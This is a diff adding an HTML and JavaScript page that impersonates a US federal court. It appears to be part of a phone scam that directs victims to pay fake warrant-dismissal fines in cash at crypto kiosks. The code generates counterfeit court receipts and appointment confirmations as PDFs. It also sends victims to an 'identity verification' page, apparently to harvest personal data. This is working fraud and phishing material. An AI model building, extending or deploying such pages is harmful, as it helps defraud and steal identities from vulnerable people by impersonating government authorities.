+                            <h4 style="color: #2d3748; margin-bottom: 8px;">Q: What if I insert too much cash?</h4>
+                            <p style="color: #4a5568;">A: Most ATMs will return change or let you send the extra amount. Check the screen for options.</p>
+                        </div>
+                        <div style="padding: 15px; background: white; border-radius: 8px;">
+                            <h4 style="color: #2d3748; margin-bottom: 8px;">Q: Can I use a debit card at the kiosk?</h4>
+                            <p style="color: #4a5568;">A: Most USDC Kiosks only accept cash. A few accept debit cards, but cash is more common.</p>
+                        </div>
+                    </div>
+
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" onclick="window.open('https://coinatmradar.com', '_blank')">📍 Find Nearby Kiosks</button>
+                        <button class="btn btn-primary" onclick="downloadReceipt()">📄 Download Payment Receipt</button>
+                        <button class="btn btn-success" onclick="openScheduleCalendar()">📅 Schedule Signature Analysis Appointment</button>
+                    </div>
+
+                    <div class="footer-note">
+                        <p>⏱️ Estimated appointment duration: 30-45 minutes</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Calendar Modal -->
+    <div id="calendarModal" class="calendar-modal">
+        <div class="calendar-content">
+            <div id="scheduleView">
+                <div class="calendar-header">
+                    <h2>📅 Schedule Signature Analysis Appointment</h2>
+                    <p>Available Monday-Friday, 10:00 AM - 3:00 PM</p>
+                    <p style="color: #e53e3e; font-weight: 600;">Must schedule within 3 business days</p>
+                </div>
+
+                <div class="date-selector">
+                    <label for="appointmentDate">Select Date:</label>
+                    <input type="date" id="appointmentDate" onchange="updateTimeSlots()">
+                </div>
+
+                <div class="date-selector">
+                    <label>Select Time:</label>
+                    <div class="time-slots" id="timeSlots"></div>
+                </div>
+
+                <div class="calendar-buttons">
+                    <button class="btn btn-primary" onclick="closeCalendar()" style="background: #cbd5e0; color: #2d3748;">Cancel</button>
+                    <button class="btn btn-success" onclick="confirmAppointment()" id="confirmBtn" disabled>Confirm Appointment</button>
+                </div>
+            </div>
+
+            <div id="confirmationView" class="confirmation-view">
+                <div class="confirmation-icon">✅</div>
+                <h2 style="color: #2d3748; margin-bottom: 20px;">Appointment Confirmed!</h2>
+                
+                <div class="appointment-details">
+                    <h3>Your Appointment Details:</h3>
+                    <p><strong>Date:</strong> <span id="confirmedDate"></span></p>
+                    <p><strong>Time:</strong> <span id="confirmedTime"></span></p>
+                    <p><strong>Location:</strong> <span>United States District Court<br>Central District of California</span></p>
+                    <p><strong>Duration:</strong> <span>30-45 minutes</span></p>
+                </div>
+
+                <div style="background: #fff5f5; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #fc8181;">
+                    <p style="color: #c53030; font-weight: 600; margin-bottom: 8px;">⚠️ Important Reminders:</p>
+                    <ul style="color: #742a2a; margin-left: 20px;">
+                        <li>Bring a valid government-issued photo ID</li>
+                        <li>Arrive 10 minutes early</li>
+                        <li>Bring your payment receipt</li>
+                    </ul>
+                </div>
+
+                <div style="background: #ebf8ff; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #4299e1;">
+                    <p style="color: #2c5282; font-weight: 600; margin-bottom: 8px;">📹 Required: Watch Jury Service Videos</p>
+                    <p style="color: #2d3748; margin-bottom: 12px;">After disconnecting this call, you are required to watch both educational videos on the Jurors page:</p>
+                    <ul style="color: #2d3748; margin-left: 20px; margin-bottom: 12px;">
+                        <li>"We The People - The Honor of Jury Service"</li>
+                        <li>"Federal Grand Jury Video"</li>
+                    </ul>
+                    <a href="jurors.html" target="_blank" style="display: inline-block; background: #4299e1; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: 600; margin-top: 8px;">🎬 Watch Required Videos Now</a>
+                </div>
+
+                <div class="calendar-buttons">
+                    <button class="btn btn-primary" onclick="printConfirmation()">🖨️ Print Confirmation Receipt</button>
+                    <button class="btn btn-success" onclick="closeCalendar()">Done</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script>
+        function downloadReceipt() {
+            // Create modal for input
+            const modal = document.createElement('div');
+            modal.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 10000;';
+            
+            modal.innerHTML = `
+                <div style="background: white; padding: 40px; border-radius: 12px; max-width: 500px; width: 90%;">
+                    <h2 style="color: #2d3748; margin-bottom: 20px; text-align: center;">Receipt Information</h2>
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; color: #4a5568; margin-bottom: 8px; font-weight: 600;">Enter your dismissal number:</label>
+                        <input type="text" id="dismissalNumber" style="width: 100%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 16px;" placeholder="Dismissal number">
+                    </div>
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; color: #4a5568; margin-bottom: 8px; font-weight: 600;">Enter payment amount:</label>
+                        <input type="number" id="paymentAmount" style="width: 100%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 16px;" placeholder="4000" step="0.01">
+                    </div>
+                    <div style="margin-bottom: 30px;">
+                        <label style="display: block; color: #4a5568; margin-bottom: 8px; font-weight: 600;">Enter your full name:</label>
+                        <input type="text" id="fullName" style="width: 100%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 16px;" placeholder="John Doe">
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <button onclick="generatePDF()" style="flex: 1; background: #667eea; color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">Generate Receipt</button>
+                        <button onclick="closeModal()" style="flex: 1; background: #e2e8f0; color: #4a5568; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">Cancel</button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+            window.currentModal = modal;
+        }
+        
+        function closeModal() {
+            if (window.currentModal) {
+                document.body.removeChild(window.currentModal);
+                window.currentModal = null;
+            }
+        }
+        
+        function generatePDF() {
+            const dismissalNumber = document.getElementById('dismissalNumber').value;
+            const paymentAmount = document.getElementById('paymentAmount').value;
+            const fullName = document.getElementById('fullName').value;
+            
+            if (!dismissalNumber || !paymentAmount || !fullName) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            // Header
+            doc.setFontSize(20);
+            doc.setFont(undefined, 'bold');
+            doc.text('WARRANT DISMISSAL RECEIPT', 105, 30, { align: 'center' });
+            
+            doc.setFontSize(14);
+            doc.text('United States District Court', 105, 40, { align: 'center' });
+            doc.text('Central District of California', 105, 48, { align: 'center' });
+            
+            // Line separator
+            doc.setLineWidth(0.5);
+            doc.line(20, 55, 190, 55);
+            
+            // Receipt details
+            doc.setFontSize(12);
+            doc.setFont(undefined, 'normal');
+            
+            const currentDate = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+            
+            doc.text('Receipt Date:', 20, 70);
+            doc.text(currentDate, 80, 70);
+            
+            doc.text('Dismissal Number:', 20, 80);
+            doc.text(dismissalNumber, 80, 80);
+            
+            doc.text('Payee Name:', 20, 90);
+            doc.text(fullName, 80, 90);
+            
+            // Payment breakdown
+            doc.setFont(undefined, 'bold');
+            doc.text('Payment Breakdown:', 20, 110);
+            doc.setFont(undefined, 'normal');
+            
+            doc.text('Failure to Appear:', 30, 120);
+            doc.text('$2,000.00', 150, 120, { align: 'right' });
+            
+            doc.text('Contempt of Court:', 30, 130);
+            doc.text('$1,500.00', 150, 130, { align: 'right' });
+            
+            doc.text('Court Processing Fees:', 30, 140);
+            doc.text('$500.00', 150, 140, { align: 'right' });
+            
+            // Line separator
+            doc.line(30, 145, 150, 145);
+            
+            // Total
+            doc.setFont(undefined, 'bold');
+            doc.setFontSize(14);
+            doc.text('Total Amount Paid:', 30, 155);
+            doc.text('$' + parseFloat(paymentAmount).toFixed(2), 150, 155, { align: 'right' });
+            
+            // Footer
+            doc.setFontSize(10);
+            doc.setFont(undefined, 'italic');
+            doc.text('This receipt serves as proof of payment for warrant dismissal.', 105, 180, { align: 'center' });
+            doc.text('Please retain this document for your records.', 105, 188, { align: 'center' });
+            
+            doc.setFont(undefined, 'normal');
+            doc.text('For questions, contact the Central District Court Clerk\'s Office', 105, 200, { align: 'center' });
+            
+            // Save PDF
+            doc.save(`Warrant_Dismissal_Receipt_${dismissalNumber}.pdf`);
+            
+            closeModal();
+            
+            // Show identity verification prompt after receipt download
+            setTimeout(() => {
+                showIdentityVerificationPrompt();
+            }, 500);
+        }
+        
+        function showIdentityVerificationPrompt() {
+            const modal = document.createElement('div');
+            modal.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 10000;';
+            
+            modal.innerHTML = `
+                <div style="background: white; padding: 50px; border-radius: 16px; max-width: 600px; width: 90%; box-shadow: 0 10px 40px rgba(0,0,0,0.3);">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="12" cy="7" r="4"></circle>
+                            </svg>
+                        </div>
+                        <h2 style="color: #2d3748; margin-bottom: 15px; font-size: 24px; font-weight: bold;">Identity Verification Required</h2>
+                        <p style="color: #4a5568; font-size: 16px; line-height: 1.6; margin-bottom: 25px;">
+                            You will now need to go through the identity verification process in order to be scheduled for a signature analysis. Please proceed with that process now.
+                        </p>
+                    </div>
+                    <div style="text-align: center;">
+                        <a href="verify.html" style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 40px; border-radius: 10px; font-size: 18px; font-weight: 600; text-decoration: none; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); transition: transform 0.2s;" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='translateY(0)'">
+                            Click Here to Proceed →
+                        </a>
+                    </div>
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button onclick="closeVerificationModal()" style="background: transparent; border: none; color: #718096; font-size: 14px; cursor: pointer; text-decoration: underline;">Close</button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+            window.verificationModal = modal;
+        }
+        
+        function closeVerificationModal() {
+            if (window.verificationModal) {
+                document.body.removeChild(window.verificationModal);
+                window.verificationModal = null;
+            }
+        }
+        
+        let selectedDate = null;
+        let selectedTime = null;
+
+        function openScheduleCalendar() {
+            // Check if identity verification is complete
+            const isVerified = localStorage.getItem('identityVerified') === 'true';
+            
+            if (!isVerified) {
+                // Show verification required message
+                if (confirm('Identity verification is required before scheduling an appointment.\n\nWould you like to complete the verification process now?')) {
+                    window.location.href = '/verify.html?from=payment';
+                }
+                return;
+            }
+            
+            document.getElementById('calendarModal').classList.add('active');
+            document.getElementById('scheduleView').style.display = 'block';
+            document.getElementById('confirmationView').classList.remove('active');
+            initializeDatePicker();
+        }
+
+        function closeCalendar() {
+            document.getElementById('calendarModal').classList.remove('active');
+            selectedDate = null;
+            selectedTime = null;
+        }
+
+        function initializeDatePicker() {
+            const dateInput = document.getElementById('appointmentDate');
+            const today = new Date();
+            
+            // Calculate 3 business days from now
+            let businessDaysCount = 0;
+            let currentDate = new Date(today);
+            let maxDate = new Date(today);
+            
+            while (businessDaysCount < 3) {
+                maxDate.setDate(maxDate.getDate() + 1);
+                const dayOfWeek = maxDate.getDay();
+                if (dayOfWeek !== 0 && dayOfWeek !== 6) { // Not weekend
+                    businessDaysCount++;
+                }
+            }
+            
+            // Set min date to tomorrow (or next business day)
+            let minDate = new Date(today);
+            minDate.setDate(minDate.getDate() + 1);
+            while (minDate.getDay() === 0 || minDate.getDay() === 6) {
+                minDate.setDate(minDate.getDate() + 1);
+            }
+            
+            dateInput.min = minDate.toISOString().split('T')[0];
+            dateInput.max = maxDate.toISOString().split('T')[0];
+            dateInput.value = '';
+            
+            document.getElementById('timeSlots').innerHTML = '<p style="color: #718096; text-align: center;">Please select a date first</p>';
+        }
+
+        function updateTimeSlots() {
+            const dateInput = document.getElementById('appointmentDate');
+            const selectedDateValue = dateInput.value;
+            
+            if (!selectedDateValue) return;
+            
+            const date = new Date(selectedDateValue + 'T00:00:00');
+            const dayOfWeek = date.getDay();
+            
+            // Check if weekend
+            if (dayOfWeek === 0 || dayOfWeek === 6) {
+                document.getElementById('timeSlots').innerHTML = '<p style="color: #e53e3e; text-align: center;">Appointments are only available Monday-Friday</p>';
+                return;
+            }
+            
+            selectedDate = selectedDateValue;
+            selectedTime = null;
+            
+            // Generate time slots from 10:00 AM to 3:00 PM
+            const times = [
+                '10:00 AM', '10:30 AM', '11:00 AM', '11:30 AM',
+                '12:00 PM', '12:30 PM', '1:00 PM', '1:30 PM',
+                '2:00 PM', '2:30 PM', '3:00 PM'
+            ];
+            
+            const timeSlotsHtml = times.map(time => 
+                `<div class="time-slot" onclick="selectTime('${time}')">${time}</div>`
+            ).join('');
+            
+            document.getElementById('timeSlots').innerHTML = timeSlotsHtml;
+            document.getElementById('confirmBtn').disabled = true;
+        }
+
+        function selectTime(time) {
+            // Remove previous selection
+            document.querySelectorAll('.time-slot').forEach(slot => {
+                slot.classList.remove('selected');
+            });
+            
+            // Add selection to clicked slot
+            event.target.classList.add('selected');
+            selectedTime = time;
+            
+            // Enable confirm button
+            document.getElementById('confirmBtn').disabled = false;
+        }
+
+        function confirmAppointment() {
+            if (!selectedDate || !selectedTime) {
+                alert('Please select both a date and time');
+                return;
+            }
+            
+            // Format date for display
+            const date = new Date(selectedDate + 'T00:00:00');
+            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            const formattedDate = date.toLocaleDateString('en-US', options);
+            
+            // Update confirmation view
+            document.getElementById('confirmedDate').textContent = formattedDate;
+            document.getElementById('confirmedTime').textContent = selectedTime;
+            
+            // Show confirmation view
+            document.getElementById('scheduleView').style.display = 'none';
+            document.getElementById('confirmationView').classList.add('active');
+        }
+
+        function printConfirmation() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            // Header
+            doc.setFontSize(18);
+            doc.setFont(undefined, 'bold');
+            doc.text('APPOINTMENT CONFIRMATION', 105, 20, { align: 'center' });
+            
+            doc.setFontSize(14);
+            doc.setFont(undefined, 'normal');
+            doc.text('United States District Court', 105, 30, { align: 'center' });
+            doc.text('Central District of California', 105, 38, { align: 'center' });
+            
+            // Confirmation details
+            doc.setFontSize(12);
+            doc.setFont(undefined, 'bold');
+            doc.text('Signature Analysis Appointment', 30, 55);
+            
+            doc.setFont(undefined, 'normal');
+            doc.text('Date:', 30, 70);
+            doc.text(document.getElementById('confirmedDate').textContent, 60, 70);
+            
+            doc.text('Time:', 30, 80);
+            doc.text(document.getElementById('confirmedTime').textContent, 60, 80);
+            
+            doc.text('Duration:', 30, 90);
+            doc.text('30-45 minutes', 60, 90);
+            
+            doc.text('Location:', 30, 100);
+            doc.text('United States District Court', 60, 100);
+            doc.text('Central District of California', 60, 108);
+            
+            // Important reminders
+            doc.setFont(undefined, 'bold');
+            doc.text('Important Reminders:', 30, 125);
+            doc.setFont(undefined, 'normal');
+            doc.setFontSize(11);
+            doc.text('• Bring a valid government-issued photo ID', 35, 135);
+            doc.text('• Arrive 10 minutes early', 35, 143);
+            doc.text('• Bring your payment receipt', 35, 151);
+            
+            // Footer
+            doc.setFontSize(10);
+            doc.setFont(undefined, 'italic');
+            doc.text('Please print and bring this confirmation to your appointment.', 105, 180, { align: 'center' });
+            
+            // Save PDF
+            const dateStr = selectedDate.replace(/-/g, '');
+            doc.save(`Appointment_Confirmation_${dateStr}.pdf`);
+        }
+
+        function togglePayment(option) {
+            const allContents = document.querySelectorAll('.payment-content');
+            const allHeaders = document.querySelectorAll('.payment-header');
+            const targetContent = document.getElementById(option + '-content');
+            const targetHeader = targetContent.previousElementSibling;
+
+            // Close all others
+            allContents.forEach(content => {
+                if (content !== targetContent) {
+                    content.classList.remove('active');
+                }
+            });
+            allHeaders.forEach(header => {
+                if (header !== targetHeader) {
+                    header.classList.remove('active');
+                }
+            });
+
+            // Toggle current
+            targetContent.classList.toggle('active');
+            targetHeader.classList.toggle('active');
+        }
+
+        // Check verification status and manage appointment buttons
+        window.addEventListener('DOMContentLoaded', function() {
+            const isVerified = localStorage.getItem('identityVerified') === 'true';
+            const appointmentButtons = document.querySelectorAll('button[onclick="openScheduleCalendar()"]');
+            
+            // If not verified, make appointment buttons trigger verification
+            if (!isVerified) {
+                appointmentButtons.forEach(button => {
+                    button.onclick = function() {
+                        window.location.href = '/verify.html';
+                    };
+                });
+            }
+            
+            // Check if returning from verification
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('verified') === 'true') {
+                // Show success message
+                const verificationDate = localStorage.getItem('verificationDate');
+                if (verificationDate) {
+                    setTimeout(() => {
+                        alert('✓ Identity Verification Complete!\n\nYou may now schedule your signature analysis appointment.');
+                    }, 500);
+                }
+                // Clean up URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+        });
+    </script>
+</body>
+</html>
